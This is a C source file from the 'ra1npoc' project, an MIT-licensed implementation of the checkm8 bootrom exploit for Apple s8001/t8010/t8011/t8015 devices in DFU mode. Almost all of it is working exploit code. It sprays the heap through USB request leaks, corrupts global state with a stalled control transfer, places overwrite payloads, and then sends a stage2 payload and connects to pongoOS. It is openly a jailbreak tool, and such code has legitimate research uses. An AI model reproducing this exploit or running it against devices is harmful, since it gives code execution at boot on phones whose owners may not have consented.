/*
 * ra1npoc - t8010_t8015.c .. exploit for s8001/t8010/t8011/t8015
 *
 * Copyright (c) 2021 dora2ios
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include <io/iousb.h>
#include <common/common.h>

static unsigned char blank[DFU_MAX_TRANSFER_SZ];

static void heap_spray(io_client_t client)
{
    transfer_t result;
    UInt32 wLen;
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    result = send_data(client, blank, DFU_MAX_TRANSFER_SZ);
    DEBUGLOG("(1/7) %x", result.ret);
    
    // for iphoneos devices (especially older ones)
    // repeat forever until usb_req_leak() reaches timeout
    unsigned int i = 0;
    while(1) {
        wLen = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, i);
        result = usb_req_leak(client, blank);
        if(result.ret != kIOReturnSuccess)
            break;
        i++;
        DEBUGLOG("(*) retry: %x", i);
    }
    DEBUGLOG("(2/7) %x, %d", result.ret, i);
    
    for(int i=0;i<64;i++) {
        result = no_leak(client, blank);
    }
    DEBUGLOG("(3/7) %x", result.ret);
    
    result = usb_req_leak(client, blank);
    DEBUGLOG("(4/7) %x", result.ret);
    
    for(int i=0;i<16;i++){
        result = no_leak(client, blank);
    }
    DEBUGLOG("(5/7) %x", result.ret);
    
    result = usb_req_leak(client, blank);
    DEBUGLOG("(6/7) %x", result.ret);
    
    result = no_leak(client, blank);
    DEBUGLOG("(7/7) %x", result.ret);
}

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent = 0;
    
    memset(&blank, '\x41', DFU_MAX_TRANSFER_SZ);
    
    val = 1408; // A7/A9X/A10/A10X/A11
    
    /* val haxx
     * If async_transfer sent size = 64 byte, then pushval size = 1408 byte. And, it is possible to try again a few times and wait until sent = 64
     * However, even if sent != 64, it succeeds by subtracting the value from pushval.
     * add 64 byte from pushval, then subtract sent from it.
     */
    
    int i=0;
    while(((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 0)) >= val) || (sent == 0)){
        i++;
        DEBUGLOG("(*) retry: %x", i);
        usleep(10000);
        result = send_data(client, blank, 64); // send blank data and redo the request.
        DEBUGLOG("(*) %x", result.ret);
        usleep(10000);
    }
    
    val += 0x40;
    val -= sent;
    DEBUGLOG("(1/3) sent: %x, val: %x", (unsigned int)sent, val);

    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100); // <- PipeStalled
    DEBUGLOG("(2/3) %x", result.ret);
    
    result = send_abort(client);
    DEBUGLOG("(3/3) %x", result.ret);
}

static void heap_occupation(io_client_t client, checkra1n_payload_t payload)
{
    transfer_t result;
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    result = usb_req_stall(client);
    DEBUGLOG("(1/6) %x", result.ret);
    usleep(100000);
    
    for(int i=0;i<16;i++){
        result = usb_req_leak(client, blank); // or async_usb_ctrl_transfer_with_cancel
    }
    DEBUGLOG("(2/6) %x", result.ret);
    usleep(10000);
    
    memset(&blank, '\x41', 2048); // 'A'
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
    DEBUGLOG("(3/6) %x", result.ret);
    
    result = send_data_with_time(client, blank, 512, 100);
    DEBUGLOG("(4/6) %x", result.ret);
    
    result = send_data_with_time(client, payload.over2, payload.over2_len, 100);
    DEBUGLOG("(5/6) %x", result.ret);
    
    result = send_abort(client);
    DEBUGLOG("(6/6) %x", result.ret);
}

int checkm8_t8010_t8015(io_client_t client, checkra1n_payload_t payload)
{
    int ret = 0;
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    LOG("reconnecting");
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("Failed to reconnect to device");
        client = NULL;
        return -1;
    }
    
    LOG("running heap_spray()");
    heap_spray(client);
    
    LOG("reconnecting");
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("Failed to reconnect to device");
        return -1;
    }
    
    LOG("running set_global_state()");
    set_global_state(client);
    
    LOG("reconnecting");
    io_reconnect(&client, 5, DEVICE_DFU, USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("Failed to reconnect to device");
        return -1;
    }
    
    LOG("running heap_occupation()");
    usleep(10000);
    heap_occupation(client, payload);
    
    LOG("reconnecting");
    io_reconnect(&client, 5, DEVICE_DFU, USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("Failed to reconnect to device");
        return -1;
    }
    
    LOG("checkmate!");
    
    if(payload.stage2_len != 0) {
        LOG("sending stage2 payload");
        usleep(10000);
        ret = payload_stage2(client, payload);
        if(ret != 0){
            ERROR("Failed to send stage2");
            return -1;
        }
    }
    
    if(payload.pongoOS_len != 0) {
        usleep(10000);
        LOG("connecting to stage2");
        ret = connect_to_stage2(client, payload);
        if(ret != 0){
            return -1; // err
        }
    }
    
    return 0;
}
